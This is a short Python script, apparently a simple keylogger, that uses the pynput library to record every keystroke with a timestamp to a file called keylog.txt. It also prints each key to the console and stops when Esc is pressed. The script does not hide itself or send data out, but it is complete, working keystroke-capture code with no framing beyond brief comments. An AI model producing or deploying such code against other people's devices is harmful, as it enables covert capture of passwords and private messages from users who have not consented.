from pynput import keyboard
import logging

# Set up logging to file (optional)
logging.basicConfig(
    filename='keylog.txt',
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
)

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')  # Log the pressed key character
        print(f'Key pressed: {key.char}')  # Print the pressed key character (optional)
    except AttributeError:
        logging.info(f'Special key pressed: {key}')  # Log special key information
        print(f'Special key pressed: {key}')  # Print special key information (optional)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listening when Esc is pressed

def main():
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Program is running... Press ESC to stop.")
    main()